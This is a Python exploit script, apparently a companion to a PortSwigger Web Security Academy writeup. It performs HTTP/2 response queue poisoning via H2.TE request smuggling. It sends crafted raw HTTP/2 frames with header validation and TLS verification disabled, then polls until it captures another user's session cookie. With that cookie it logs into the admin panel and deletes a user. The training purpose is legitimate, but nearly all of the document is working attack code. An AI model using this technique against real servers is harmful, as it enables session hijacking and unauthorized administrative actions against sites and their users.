#!/usr/bin/env python3
"""
Response queue poisoning via H2.TE request smuggling
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 08-response-queue-poisoning-h2-te.md

What this does:
    Speaks raw HTTP/2 frames via the Python h2 library to send a
    "transfer-encoding: chunked" header directly on an HTTP/2 request --
    metadata HTTP/2 itself ignores, but which becomes a real, meaningful
    header the instant the front-end downgrades the request to HTTP/1.1
    text for the back-end. The body is a complete standalone
    "GET /x HTTP/1.1" request wrapped in a chunked "0" terminator, so the
    back-end generates two responses where the front-end only expects one --
    poisoning the response queue. Both the poisoning request and the
    smuggled request target the nonexistent path /x, so every normal
    response is a clean 404 and anything else is unambiguous proof we
    captured someone else's response.

    A normal HTTP/2 client library validates and normalizes outbound
    headers, which would silently sanitize this mismatch away -- this uses
    the h2 library directly with validate_outbound_headers=False and
    normalize_outbound_headers=False, the configuration that made H2
    smuggling possible from Python at all in this series.

Usage:
    python 08-response-queue-poisoning-h2-te.py <lab-url>
    e.g. python 08-response-queue-poisoning-h2-te.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install h2 httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_h2_connection(host: str, port: int = 443, timeout: float = 10.0):
    """Raw HTTP/2 TLS connection with header validation/normalization disabled --
    a normal h2 client would refuse or sanitize the transfer-encoding header this
    attack depends on."""
    import h2.connection as h2c
    import h2.config as h2cfg

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    sock = socket.create_connection((host, port), timeout=timeout)
    ssl_sock = ctx.wrap_socket(sock, server_hostname=host)

    config = h2cfg.H2Configuration(
        client_side=True, header_encoding="utf-8",
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
    )
    conn = h2c.H2Connection(config=config)
    conn.initiate_connection()
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(3)
    try:
        data = ssl_sock.recv(65535)
        conn.receive_data(data)
        ssl_sock.sendall(conn.data_to_send())
    except socket.timeout:
        pass

    return ssl_sock, conn


def send_rqp_probe(host: str, port: int = 443, timeout: float = 5.0) -> dict:
    """Send one H2.TE response-queue-poisoning probe against /x. Returns the
    response dict for whatever came back -- normally our own 404, but a
    poisoned queue occasionally hands us someone else's response instead."""
    import h2.events as h2e

    ssl_sock, conn = create_h2_connection(host, port)
    smuggled = f"GET /x HTTP/1.1\r\nHost: {host}\r\n\r\n"
    body = f"0\r\n\r\n{smuggled}".encode()

    headers = [
        (":method", "POST"),
        (":path", "/x"),
        (":authority", host),
        (":scheme", "https"),
        ("content-type", "application/x-www-form-urlencoded"),
        ("transfer-encoding", "chunked"),
    ]

    conn.send_headers(1, headers, end_stream=False)
    conn.send_data(1, body, end_stream=True)
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(timeout)
    result = {"status": None, "headers": {}, "data": b""}
    try:
        while True:
            chunk = ssl_sock.recv(4096)
            if not chunk:
                break
            events = conn.receive_data(chunk)
            for event in events:
                if isinstance(event, h2e.ResponseReceived):
                    hdrs = dict(event.headers)
                    result["headers"] = hdrs
                    status = hdrs.get(b":status", hdrs.get(":status", b""))
                    result["status"] = status.decode() if isinstance(status, bytes) else status
                elif isinstance(event, h2e.DataReceived):
                    result["data"] += event.data
                    conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                elif isinstance(event, h2e.StreamEnded):
                    ssl_sock.sendall(conn.data_to_send())
                    ssl_sock.close()
                    return result
            ssl_sock.sendall(conn.data_to_send())
    except socket.timeout:
        pass
    ssl_sock.close()
    return result


def solve(lab_url: str, max_attempts: int = 60, interval: float = 5.0) -> None:
    host = urlparse(lab_url).hostname

    print("[*] Poisoning the response queue via a direct transfer-encoding header "
          "on /x, polling every ~5s for a non-404 response...")

    session = None
    for attempt in range(1, max_attempts + 1):
        try:
            result = send_rqp_probe(host)
        except Exception as e:
            print(f"  [{attempt}] error: {e}")
            time.sleep(interval)
            continue

        status = result["status"]
        print(f"  [{attempt}/{max_attempts}] status={status}")

        if status and status != "404":
            all_text = str(result["headers"]) + result["data"].decode(errors="replace")
            cookie_match = re.search(r"session=([a-zA-Z0-9]+)", all_text)
            if cookie_match:
                session = cookie_match.group(1)
                print(f"[+] Captured a non-404 response at attempt {attempt} carrying "
                      f"a session cookie: {session}")
                break
            print(f"[*] Captured a non-404 response at attempt {attempt} but no session "
                  f"cookie in it -- continuing (queue is still settling).")

        time.sleep(interval)

    if not session:
        print(f"[-] No admin session captured after {max_attempts} attempts. If the "
              f"attack stalls, PortSwigger's own solution notes sending 10 ordinary "
              f"requests resets the connection -- rerun this script to retry.")
        return

    # Access the admin panel repeatedly -- response queue poisoning sometimes
    # surfaces intermediate wrong responses while the queue settles.
    for attempt in range(1, 6):
        r = httpx.get(f"{lab_url}/admin", cookies={"session": session}, verify=False)
        print(f"[*] GET /admin with captured session -- status {r.status_code}")
        if r.status_code == 200:
            m = re.search(r'(/admin/delete\?username=carlos)', r.text)
            if m:
                delete_link = m.group(1)
                httpx.get(f"{lab_url}{delete_link}", cookies={"session": session}, verify=False)
                print(f"[+] Deleted carlos via {delete_link}.")
            break
        time.sleep(2)

    check = httpx.get(lab_url + "/", verify=False)
    if "is-solved" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- rerun; response queue poisoning is probabilistic.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
